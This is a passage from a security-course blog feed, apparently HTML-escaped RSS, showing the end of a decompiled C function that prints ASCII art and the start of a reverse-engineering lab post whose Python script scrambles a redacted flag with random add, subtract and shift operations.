&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#f92672">&amp;amp;&lt;/span>icon[&lt;span style="color:#ae81ff">6760&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>LL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Reverse - 0x27(2023 Lab - Scramble)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x272023-lab---scramble/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/simple-reverse---0x272023-lab---scramble/</guid><description>&lt;h1 id="simple-reverse---0x272023-lab---scramble">
 Simple Reverse - 0x27(2023 Lab - Scramble)
 &lt;a class="anchor" href="#simple-reverse---0x272023-lab---scramble">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler scramble.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> random
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">generate_scramble_pattern&lt;/span>(pattern_length, max_shift, max_add_sub):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scramble_pattern &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">1&lt;/span>, pattern_length)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> operation &lt;span style="color:#f92672">=&lt;/span> random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> operation &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_value &lt;span style="color:#f92672">=&lt;/span> random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">1&lt;/span>, max_add_sub)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> operation &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> add_value &lt;span style="color:#f92672">=&lt;/span> random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">1&lt;/span>, max_add_sub)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scramble_pattern&lt;span style="color:#f92672">.&lt;/span>append((&lt;span style="color:#e6db74">&amp;#39;add&amp;#39;&lt;/span>, add_value))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> operation &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_value &lt;span style="color:#f92672">=&lt;/span> random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">1&lt;/span>, max_add_sub)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scramble_pattern&lt;span style="color:#f92672">.&lt;/span>append((&lt;span style="color:#e6db74">&amp;#39;sub&amp;#39;&lt;/span>, sub_value))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> operation &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> shift_value &lt;span style="color:#f92672">=&lt;/span> random&lt;span style="color:#f92672">.&lt;/span>randint(&lt;span style="color:#ae81ff">1&lt;/span>, max_shift)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scramble_pattern&lt;span style="color:#f92672">.&lt;/span>append((&lt;span style="color:#e6db74">&amp;#39;lsh&amp;#39;&lt;/span>, shift_value))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> scramble_pattern
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">apply_scramble_pattern&lt;/span>(input_bytes, patterns):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i, operations &lt;span style="color:#f92672">in&lt;/span> enumerate(patterns):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> src &lt;span style="color:#f92672">=&lt;/span> input_bytes[i]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> operation &lt;span style="color:#f92672">in&lt;/span> operations:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> operation &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> operation[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;add&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> src &lt;span style="color:#f92672">+=&lt;/span> operation[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> operation[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;sub&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> src &lt;span style="color:#f92672">-=&lt;/span> operation[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> operation[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;lsh&amp;#39;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> src &lt;span style="color:#f92672">&amp;lt;&amp;lt;=&lt;/span> operation[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> src &lt;span style="color:#f92672">&amp;amp;=&lt;/span> &lt;span style="color:#ae81ff">0xffffffff&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result&lt;span style="color:#f92672">.&lt;/span>append(src)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>k_FLAG &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;FLAG&lt;/span>&lt;span style="color:#e6db74">{REDACTED}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>patterns &lt;span style="color:#f92672">=&lt;/span> [generate_scramble_pattern(&lt;span style="color:#ae81ff">6&lt;/span>, max_shift&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>, max_add_sub&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0xffff&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(k_FLAG)) ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>scrambled_result &lt;span style="color:#f92672">=&lt;/span> apply_scramble_pattern(k_FLAG, patterns)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#34;Input Bytes:&amp;#34;&lt;/span>, k_FLAG, len(k_FLAG))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># REDACTED, 42&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#34;Scramble Pattern:&amp;#34;&lt;/span>, patterns)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># [[(&amp;#39;sub&amp;#39;, 20935)], [(&amp;#39;sub&amp;#39;, 31575), (&amp;#39;lsh&amp;#39;, 9), (&amp;#39;add&amp;#39;, 45363), (&amp;#39;add&amp;#39;, 35372), (&amp;#39;sub&amp;#39;, 15465)], [(&amp;#39;add&amp;#39;, 19123), (&amp;#39;add&amp;#39;, 35260), (&amp;#39;sub&amp;#39;, 49421), (&amp;#39;lsh&amp;#39;, 8)], [(&amp;#39;lsh&amp;#39;, 1), (&amp;#39;sub&amp;#39;, 4977), (&amp;#39;sub&amp;#39;, 55837)], [(&amp;#39;add&amp;#39;, 16937)], [(&amp;#39;sub&amp;#39;, 56984), (&amp;#39;lsh&amp;#39;, 2), (&amp;#39;sub&amp;#39;, 32363), (&amp;#39;sub&amp;#39;, 46293)], [(&amp;#39;sub&amp;#39;, 94), (&amp;#39;sub&amp;#39;, 48860), (&amp;#39;sub&amp;#39;, 18342), (&amp;#39;lsh&amp;#39;, 3)], [(&amp;#39;add&amp;#39;, 37549), (&amp;#39;sub&amp;#39;, 36283), (&amp;#39;lsh&amp;#39;, 6), (&amp;#39;add&amp;#39;, 6253)], [(&amp;#39;add&amp;#39;, 34661), (&amp;#39;sub&amp;#39;, 13281), (&amp;#39;sub&amp;#39;, 64107)], [(&amp;#39;sub&amp;#39;, 8525), (&amp;#39;sub&amp;#39;, 30349), (&amp;#39;sub&amp;#39;, 26744)], [(&amp;#39;lsh&amp;#39;, 2), (&amp;#39;sub&amp;#39;, 18120), (&amp;#39;sub&amp;#39;, 63091), (&amp;#39;add&amp;#39;, 17287), (&amp;#39;sub&amp;#39;, 37618), (&amp;#39;add&amp;#39;, 2237)], [(&amp;#39;sub&amp;#39;, 48573), (&amp;#39;sub&amp;#39;, 4449), (&amp;#39;add&amp;#39;, 36013), (&amp;#39;sub&amp;#39;, 64051)], [(&amp;#39;add&amp;#39;, 10415), (&amp;#39;lsh&amp;#39;, 3), (&amp;#39;lsh&amp;#39;, 10)], [(&amp;#39;add&amp;#39;, 5676), (&amp;#39;lsh&amp;#39;, 3), (&amp;#39;lsh&amp;#39;, 10), (&amp;#39;add&amp;#39;, 32002), (&amp;#39;sub&amp;#39;, 60775)], [(&amp;#39;add&amp;#39;, 35939), (&amp;#39;sub&amp;#39;, 32666), (&amp;#39;sub&amp;#39;, 45639), (&amp;#39;add&amp;#39;, 2077), (&amp;#39;sub&amp;#39;, 16253)], [(&amp;#39;sub&amp;#39;, 30392), (&amp;#39;sub&amp;#39;, 26913), (&amp;#39;sub&amp;#39;, 14009), (&amp;#39;sub&amp;#39;, 62416)], [(&amp;#39;sub&amp;#39;, 15056), (&amp;#39;sub&amp;#39;, 40527)], [(&amp;#39;lsh&amp;#39;, 5)], [(&amp;#39;lsh&amp;#39;, 1), (&amp;#39;sub&amp;#39;, 16070)], [(&amp;#39;add&amp;#39;, 2045)], [(&amp;#39;lsh&amp;#39;, 8), (&amp;#39;add&amp;#39;, 37087), (&amp;#39;sub&amp;#39;, 22013), (&amp;#39;lsh&amp;#39;, 10), (&amp;#39;lsh&amp;#39;, 2)], [(&amp;#39;add&amp;#39;, 31880), (&amp;#39;sub&amp;#39;, 56557), (&amp;#39;lsh&amp;#39;, 6), (&amp;#39;lsh&amp;#39;, 5), (&amp;#39;lsh&amp;#39;, 8), (&amp;#39;add&amp;#39;, 15535)], [(&amp;#39;add&amp;#39;, 22937), (&amp;#39;add&amp;#39;, 4060)], [(&amp;#39;add&amp;#39;, 8462), (&amp;#39;sub&amp;#39;, 4463), (&amp;#39;sub&amp;#39;, 45810), (&amp;#39;lsh&amp;#39;, 1)], [(&amp;#39;sub&amp;#39;, 10144), (&amp;#39;lsh&amp;#39;, 8), (&amp;#39;lsh&amp;#39;, 5), (&amp;#39;lsh&amp;#39;, 1), (&amp;#39;lsh&amp;#39;, 8)], [(&amp;#39;add&amp;#39;, 49937), (&amp;#39;lsh&amp;#39;, 2), (&amp;#39;add&amp;#39;, 60982), (&amp;#39;sub&amp;#39;, 24799)], [(&amp;#39;lsh&amp;#39;, 4), (&amp;#39;add&amp;#39;, 53340), (&amp;#39;add&amp;#39;, 50619), (&amp;#39;sub&amp;#39;, 56111), (&amp;#39;add&amp;#39;, 6134), (&amp;#39;lsh&amp;#39;, 1)], [(&amp;#39;sub&amp;#39;, 22577), (&amp;#39;sub&amp;#39;, 50645)], [(&amp;#39;add&amp;#39;, 21265), (&amp;#39;sub&amp;#39;, 41440)], [(&amp;#39;add&amp;#39;, 63314), (&amp;#39;sub&amp;#39;, 45755), (&amp;#39;add&amp;#39;, 62216)], [(&amp;#39;sub&amp;#39;, 52616)], [(&amp;#39;add&amp;#39;, 21192)], [(&amp;#39;add&amp;#39;, 62573), (&amp;#39;sub&amp;#39;,18811)], [(&amp;#39;add&amp;#39;, 35452), (&amp;#39;sub&amp;#39;, 11573), (&amp;#39;sub&amp;#39;, 49079), (&amp;#39;sub&amp;#39;, 36361), (&amp;#39;sub&amp;#39;, 26862), (&amp;#39;lsh&amp;#39;, 9)], [(&amp;#39;add&amp;#39;, 13610), (&amp;#39;lsh&amp;#39;, 7), (&amp;#39;lsh&amp;#39;, 3), (&amp;#39;sub&amp;#39;, 28490), (&amp;#39;lsh&amp;#39;, 10), (&amp;#39;add&amp;#39;, 44742)], [(&amp;#39;lsh&amp;#39;, 10), (&amp;#39;sub&amp;#39;, 1797), (&amp;#39;sub&amp;#39;, 10564), (&amp;#39;add&amp;#39;, 12394)], [(&amp;#39;add&amp;#39;, 45165), (&amp;#39;lsh&amp;#39;, 10), (&amp;#39;sub&amp;#39;, 60610), (&amp;#39;sub&amp;#39;, 63002), (&amp;#39;sub&amp;#39;, 14851), (&amp;#39;lsh&amp;#39;, 1)], [(&amp;#39;add&amp;#39;, 34840), (&amp;#39;lsh&amp;#39;, 3), (&amp;#39;sub&amp;#39;, 16907)], [(&amp;#39;add&amp;#39;, 4404), (&amp;#39;lsh&amp;#39;, 3), (&amp;#39;lsh&amp;#39;, 7), (&amp;#39;lsh&amp;#39;, 6)], [(&amp;#39;lsh&amp;#39;, 6), (&amp;#39;add&amp;#39;, 51738), (&amp;#39;sub&amp;#39;, 24621), (&amp;#39;add&amp;#39;, 58646)], [(&amp;#39;lsh&amp;#39;, 1)], [(&amp;#39;add&amp;#39;, 29375), (&amp;#39;sub&amp;#39;, 419), (&amp;#39;add&amp;#39;, 2854), (&amp;#39;sub&amp;#39;, 11878), (&amp;#39;lsh&amp;#39;, 10), (&amp;#39;add&amp;#39;, 40151)], [(&amp;#39;add&amp;#39;, 22953)]]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#34;Scrambled Result:&amp;#34;&lt;/span>, scrambled_result)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># [4294946431, 4278905078, 1286912, 4294906624, 17060, 4294661164, 4294429720, 94573, 4294924666, 4294901787, 4294868383, 4294886344, 86147072, 47247259, 4294910851, 4294833676, 4294911813, 3040, 4294951460, 2160, 171843584, 4734127, 27100, 4294883864, 884998144, 236375, 111420, 4294894192, 4294947222, 79889, 4294914775, 21308, 43873, 4249743360, 1477674694, 113697, 92442178, 262757, 295239680, 91843, 210, 20569303, 23078]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::
